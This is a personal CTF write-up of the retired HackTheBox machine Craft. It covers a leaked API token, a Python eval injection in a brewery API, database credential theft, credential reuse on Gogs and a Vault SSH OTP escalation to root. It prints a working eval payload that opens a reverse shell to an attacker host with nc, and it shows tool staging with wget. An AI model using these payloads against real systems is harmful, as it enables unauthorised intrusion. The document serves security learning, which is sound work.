# Craft - HackTheBox VIP+ Retired

**Date:** 2026-06-26
**Difficulty:** Medium
**OS:** Linux
**Category:** API / Code Review
**Status:** Complete

---

## Summary

Craft centers on a self-hosted Gogs server holding a public repository for a brewery-tracking API. An open issue in that repository exposes a working API token, and the linked commit reveals an unsafe `eval` call added to validate a numeric field. That eval call has no input sanitization, which turns a normal API request into arbitrary Python code execution on the container running the API. From the container, a config file exposes MySQL credentials, and the user table in that database yields credentials for three accounts. SSH and the container itself stayed locked to the original access already in hand, but one of those three accounts works directly against the separate Gogs login, where a private repository under that account holds an SSH key. The final step uses Vault, a credential management tool already installed on the box, to generate a one-time password for a pre-configured root SSH role. The machine is less about any single difficult technique and more about chaining several independent, individually modest findings (a leaked token, a config file, a credential reused on a different service, a tool nobody had reason to expect) into a full path.

---

## Reconnaissance

### Port Scan

```
nmap -sS -sV -sC -p- --min-rate 5000 -T4 -oN 20260626093736_scan_tcp.nmap 10.129.6.75
```

**Open ports:**
- 22/tcp: ssh, OpenSSH 7.4p1 Debian
- 443/tcp: ssl/http, nginx 1.15.8, certificate commonName=craft.htb
- 6022/tcp: ssh, Golang x/crypto/ssh server

**Initial observations:**

The TLS certificate's commonName directly named the domain, `craft.htb`, ahead of even loading the page. A second SSH service on 6022, identified specifically as a Go-implemented SSH server, stood out as unusual enough to be worth returning to later, though the actual path ran entirely through ports 443 and 22 instead.

`/etc/hosts` was updated to map `craft.htb` to the target IP before browsing.

---

## Enumeration

Browsing to `https://craft.htb` on port 443 returned a page named "About," whose content linked out to two additional subdomains: `api.craft.htb` and `gogs.craft.htb`. Both were added to `/etc/hosts` alongside the base domain.

`gogs.craft.htb` resolved to a self-hosted Gogs server, a self-hosted Git service comparable to a private GitHub instance. Browsing its public repository listing surfaced a single public repository, `Craft/craft-api`.

That repository had one open issue, filed by a user named `dinesh`. The issue itself exposed a working API token for `api.craft.htb`, along with a sample request showing the token used against the API's `brew` endpoint. The linked commit referenced in that same issue added an `eval()` call to the endpoint's input validation logic, checking that a submitted ABV (alcohol by volume) value was a decimal less than 1.0.

`eval()` in Python executes whatever string is passed to it as live Python code, well beyond simply checking a value. Because the field's content was passed into `eval()` directly with no sanitization, any value submitted in that field would run as Python directly on the server, well beyond a simple numeric check.

---

## Exploitation

### Confirming and weaponizing the eval injection

A test script attached to the same Gogs issue (referenced as `tests/test.py` in the repository) authenticated against the API using a leaked username and password for `dinesh`, retrieved a session token, and submitted a brew creation request with a deliberately invalid ABV value to confirm the validation logic was still active and unpatched.

```python
response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '[REDACTED-PASSWORD]'), verify=False)
json_response = json.loads(response.text)
token = json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }

response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

Running this script confirmed both that the token was valid and that the endpoint still rejected an ABV of `15.0` with the exact validation message described in the issue:

```
{"message":"Token is valid!"}

Create bogus ABV brew
"ABV must be a decimal value less than 1.0"
```

This confirmed the vulnerable validation code was live and unpatched, and that the leaked token worked.

With the injection point confirmed, the same script was modified in place rather than rewritten from scratch: the `abv` field was replaced with a Python expression using `__import__('os').system(...)` to invoke an OS command directly through the same `eval()` call, specifically a reverse shell one-liner using `mkfifo` and `nc`. The script that confirmed the vulnerability became the script that weaponized it, just by swapping one field's content.

```python
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] 1234 >/tmp/f')"
```

With a `nc` listener running on the attacking machine beforehand, submitting the modified request returned a working shell on the API container, running as `root` inside that container:

```
nc -lvp 1234
listening on [any] 1234 ...
connect to [attacker-ip] from craft.htb [10.129.6.75] 37649
/bin/sh: can't access tty; job control turned off
/opt/app # ls
app.py
craft_api
dbtest.py
tests
```

### Identifying the container

```
/opt/app # ls -al
```

The presence of a `.git` directory alongside `app.py` and a `craft_api` package directly in `/opt/app` confirmed this was the application's own working directory specifically, and the contained, minimal filesystem layout was consistent with a container instead of a full host.

---

## Post-Exploitation / Privilege Escalation

### Config file to MySQL credentials

Reading `craft_api/settings.py` directly in the application directory exposed the Flask application's own configuration, including a MySQL host, username, password, and database name used by the API to connect to its backend database.

The database host (`db`) stayed reachable only from inside the container, consistent with an internal-only service the API depends on but the outside world was never meant to reach directly.

### From database access to a Gogs login

A local script, `dbtest.py`, was already present in the application directory and demonstrated the expected pattern for connecting to MySQL using the `pymysql` library and the credentials found in `settings.py`. The container had no text editor available, so rather than typing a follow-on script inline, a modified version (`dbtest2.py`, querying the `user` table instead of just listing tables) was written on the attacking machine, hosted with Python's built-in HTTP server, and pulled onto the container directly:

```
/opt/app # wget http://[attacker-ip]:8000/dbtest2.py
/opt/app # python dbtest2.py
```

Following the same connection pattern as `dbtest.py`, this listed the database's tables, then queried the `user` table directly:

```
[{'id': 1, 'username': 'dinesh', 'password': '[REDACTED]'}, {'id': 4, 'username': 'ebachman', 'password': '[REDACTED]'}, {'id': 5, 'username': 'gilfoyle', 'password': '[REDACTED]'}]
```

Three sets of credentials came back. None of them worked directly against SSH. The same `gilfoyle` password did work against the Gogs web login, a service that had already been enumerated earlier with a different account and was worth re-testing now that a new credential existed.

Logged in as `gilfoyle` on Gogs, a private repository under that account contained an SSH key for the `gilfoyle` system account, encrypted with a passphrase. The same password already recovered from the database worked as that passphrase, and the key authenticated directly over SSH, retrieving the user flag from `gilfoyle`'s home directory.

### Vault and the root OTP

`gilfoyle`'s home directory contained a `.vault-token` file. Vault, present on the box as the `vault` binary, is a HashiCorp tool for managing secrets and access credentials, in this case configured specifically to manage SSH access to the box itself, as confirmed by the `VAULT_ADDR` environment variable pointing at a local Vault server.

A `secrets.sh` script, found in the same private Gogs repository that held the SSH key, showed how this had been configured: an SSH secrets backend enabled in Vault, with a role named `root_otp` set up to generate one-time passwords for SSH logins as `root`, allowed from any source address.

```bash
vault secrets enable ssh
vault write ssh/roles/root_otp key_type=otp default_user=root cidr_list=0.0.0.0/0
```

Using the existing Vault token, the `vault ssh` subcommand was used directly against the pre-configured role to request a one-time password and initiate the SSH connection in the same step:

```
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.129.6.75
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: [REDACTED-OTP]
The authenticity of host '10.129.6.75 (10.129.6.75)' can't be established.
ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.129.6.75' (ECDSA) to the list of known hosts.

Password:
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The OTP returned directly in the `vault ssh` command's own output was entered as the SSH password when prompted, completing a root login. The root flag was retrieved from `/root/root.txt`.

---

## Flags

- User flag: retrieved
- Root flag: retrieved

---

## What I Learned

- An open issue or commit history on a self-hosted Git server is worth treating as a primary source of intelligence on the application itself, beyond its role as a project management artifact. A leaked token and a description of a code change both came directly from this single issue.
- `eval()` on unsanitized user input is a direct code execution primitive, beyond just a loose input validation check. Any field validated this way is worth testing directly with a Python expression, since validation logic that looks like a numeric range check can still be hiding live code execution underneath.
- The moment a shell exists, identity and environment should be checked first, directly. What user the process runs as, and whether the foothold is a container, are both answered with a single direct command each.
- A running application's own purpose is a direct guide to where its secrets live. An API that talks to a database needs that database's connection details stored somewhere on disk, and a settings or config file near the application code is the first place to look for them, across virtually any common web framework.
- A credential found in one place should be re-tested against every other service already discovered, including ones beyond the most obvious one. The recovered database credentials failed against SSH but worked against a completely separate Gogs login that had already been seen earlier in the engagement.
- A `.vault-token` file or a `VAULT_ADDR` environment variable is a direct signal that HashiCorp Vault is in use for credential or access management on the box, and is worth recognizing immediately as a named tool with its own documented subcommands.
- A foothold with no text editor and no convenient way to type a multi-line script inline is not a dead end. Writing the follow-on script on the attacking machine, hosting it with a quick local HTTP server (`python3 -m http.server`), and pulling it onto the target with `wget` or `curl` is a fast, repeatable way to stage tooling onto a constrained shell. This generalizes well beyond this machine to any limited or non-interactive foothold.

---

## What I Would Do Differently

- I referred to the official write-up from the point of finding the leaked credentials in the user table onward. The realization that the API was running inside a container, and that the resulting MySQL access needed to be pivoted toward something usable elsewhere, came from that write-up directly.
- The question of what user the API process was running as stalled me longer than it should have. The shell already existed at that point, and the answer was a single direct command away. This is a reflex worth building, separate from any deeper reasoning the rest of the box required.
- Vault, and specifically its SSH secrets engine and OTP mode, was entirely unfamiliar going in. There was no way to reason toward `vault ssh -role root_otp -mode otp` without having seen Vault's SSH secrets documentation, or without already knowing the tool existed and what its subcommands do. This sits squarely in lookup territory. No amount of reasoning from first principles gets to that specific subcommand without prior exposure to the tool.
- I would build the habit of checking re-use of every recovered credential against every previously discovered login surface as an explicit, repeated step, instead of stopping at the most likely-looking service first.

---

## References

- [Gogs](https://gogs.io/) - self-hosted Git service hosting the public repository that exposed the API token and the vulnerable commit
- Python `eval()` documentation - referenced for understanding why an unsanitized `eval()` call on user input is a direct code execution primitive
- [PyMySQL documentation](https://pymysql.readthedocs.io/) - referenced for the connection and query pattern used to pull the user table from the container
- [HashiCorp Vault - SSH Secrets Engine documentation](https://developer.hashicorp.com/vault/docs/secrets/ssh) - referenced for understanding the `root_otp` role configuration and the `vault ssh` subcommand
- HTB official write-up for Craft (retired machine, accessed via the machine's own profile page) - consulted from the database-to-Gogs pivot onward, including the container identification, the credential reuse path, and the Vault OTP step
